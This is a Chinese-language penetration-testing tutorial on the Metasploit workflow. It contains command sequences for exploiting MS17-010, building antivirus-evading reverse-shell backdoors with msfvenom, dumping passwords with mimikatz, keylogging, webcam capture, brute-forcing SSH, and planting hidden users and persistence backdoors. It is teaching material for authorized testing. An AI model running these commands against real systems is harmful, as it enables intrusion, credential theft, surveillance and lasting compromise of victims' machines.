---
title: Metasploit 框架实战：从漏洞利用到后渗透
slug: kali-metasploit框架实战-k5e6f
date: 2026-08-30
visibility: public
tags: Kali Linux, Metasploit, 漏洞利用, 渗透测试, 教程
---

# Metasploit 框架实战：从漏洞利用到后渗透

Metasploit Framework（MSF）是世界上最强大的渗透测试框架，没有之一。它集成了数千个漏洞利用模块、辅助模块和后渗透功能，是每个安全从业者必须掌握的工具。本文从基础操作讲到后渗透技术，带你完整理解 MSF 工作流。

## 一、Metasploit 核心概念

| 术语 | 含义 |
|------|------|
| Exploit | 漏洞利用模块，利用目标漏洞 |
| Payload | 攻击载荷，在目标上执行的代码 |
| Auxiliary | 辅助模块，扫描、嗅探等 |
| Post | 后渗透模块，获得 shell 后的操作 |
| Encoder | 编码器，绕过杀毒软件 |
| Listener | 监听器，等待反弹连接 |
| Session | 会话，与被控目标的连接 |

## 二、基础操作

### 启动 MSF

```bash
# 启动控制台
msfconsole

# 启动并连接数据库
msfdb init
msfconsole -q

# 查看数据库状态
db_status
```

### 模块搜索

```bash
# 搜索关键词
search eternalblue
search type:exploit name:apache
search type:auxiliary name:scan

# 按 CVE 搜索
search CVE-2021-44228

# 按平台搜索
search platform:windows type:exploit
```

### 模块操作

```bash
# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 查看模块信息
info

# 查看需要配置的参数
show options

# 设置参数
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# 查看可选 Payload
show payloads

# 设置 Payload
set payload windows/x64/meterpreter/reverse_tcp

# 检查漏洞是否存在（不利用）
check

# 执行利用
exploit
# 或简写
run
```

## 三、Payload 详解

### Payload 类型

| 类型 | 说明 | 适用场景 |
|------|------|---------|
| Single | 独立载荷，无依赖 | 空间受限 |
| Stager | 分阶段加载器 | 体积小，先建立连接 |
| Stage | 第二阶段载荷 | Meterpreter 等 |

### 常用 Payload

```bash
# 反弹 TCP Shell（最常用）
set payload windows/x64/meterpreter/reverse_tcp

# 正向 Shell（目标主动连接）
set payload windows/x64/meterpreter/bind_tcp

# 纯命令行 Shell
set payload windows/x64/shell/reverse_tcp

# Python Shell
set payload python/meterpreter/reverse_tcp

# Linux Meterpreter
set payload linux/x64/meterpreter/reverse_tcp
```

### 生成独立 Payload

```bash
# 生成 EXE 后门
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# 生成 Python 载荷
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# 生成 PHP 载荷
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# 编码绕过杀软
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe \
  -e x86/shikata_ga_nai -i 5 -o shell_encoded.exe
```

## 四、Meterpreter 详解

Meterpreter 是 MSF 最强大的 Payload，获得 Meterpreter shell 后，你几乎可以完全控制目标。

### 系统信息收集

```meterpreter
# 系统信息
sysinfo

# 当前用户
getuid

# 查看网络
ipconfig
route

# 查看进程
ps

# 查看端口
netstat -an
```

### 文件操作

```meterpreter
# 下载文件
download C:\\Users\\target\\Desktop\\secret.txt

# 上传文件
upload /root/tool.exe C:\\Users\\target\\

# 查看文件
cat C:\\Windows\\System32\\drivers\\etc\\hosts

# 编辑文件
edit C:\\Windows\\win.ini

# 搜索文件
search -f *.txt -d C:\\Users\\

# 切换目录
cd C:\\Users
pwd
ls
```

### 权限提升

```meterpreter
# 尝试提权
getsystem

# 查看当前权限
getuid

# 加载 mimikatz 抓密码
load kiwi
creds_all

# 或使用旧版 mimikatz
load mimikatz
msv
kerberos
wdigest
```

### 屏幕与键盘

```meterpreter
# 截屏
screenshot

# 桌面操作
desktop -p

# 键盘记录
keyscan_start
keyscan_stop
keyscan_dump

# 摄像头
webcam_list
webcam_snap
```

### 网络透视

```meterpreter
# 端口转发
portfwd add -l 8080 -p 80 -r 10.0.0.5

# 路由添加（内网渗透）
run autoroute -s 10.0.0.0/24
run autoroute -p

# SOCKS 代理
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
```

## 五、实战场景

### 场景 1：利用永恒之蓝（MS17-010）

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
```

### 场景 2：利用弱口令 SSH

```bash
# 先用 auxiliary 扫描 SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASSWORD password
set PASS_FILE /root/passwords.txt
run
```

### 场景 3：后渗透 - 权限维持

```meterpreter
# 添加隐藏用户
run post/windows/manage/add_user USERNAME=backdoor PASSWORD=P@ss1234

# 植入持久化后门
run persistence -X -i 60 -p 4444 -r 192.168.1.50

# 注册表植入
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\shell.exe"
```

## 六、多会话管理

```bash
# 查看所有会话
sessions -l

# 切换到指定会话
sessions -i 1

# 后台运行当前会话
background

# 会话升级
sessions -u 1  # 升级为 Meterpreter

# 批量执行命令
sessions -i 1 -c "sysinfo"
```

## 七、常用辅助模块

```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
run

# SMB 版本扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# 密码爆破
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE /root/users.txt
set PASS_FILE /root/pass.txt
run

# Web 目录扫描
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
run
```

## 八、安全提醒

> Metasploit 是真正的攻击工具，使用时必须确保获得书面授权。在生产环境中利用漏洞可能导致服务中断。建议在 HackTheBox、TryHackMe 或本地虚拟机环境中练习。

## 常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| Exploit 失败 | 目标已打补丁 | 检查目标版本 |
| 连接超时 | 防火墙阻断 | 换端口或用 bind_tcp |
| 杀软报毒 | Payload 未编码 | 用 msfvenom 编码 |
| Meterpreter 掉线 | 目标重启/杀进程 | 用 persistence 持久化 |
| 提权失败 | 权限不足 | 尝试 bypassuac |

## 小结

- `search` → `use` → `set options` → `exploit` 是 MSF 基本工作流
- Meterpreter 提供完整后渗透能力：文件、密码、屏幕、网络
- `msfvenom` 生成独立载荷，`msfconsole` 管理监听
- 后渗透操作比利用漏洞更重要——拿到 shell 只是开始

> 下一篇我们将学习密码攻击技术，从暴力破解到哈希提取再到密码喷洒。
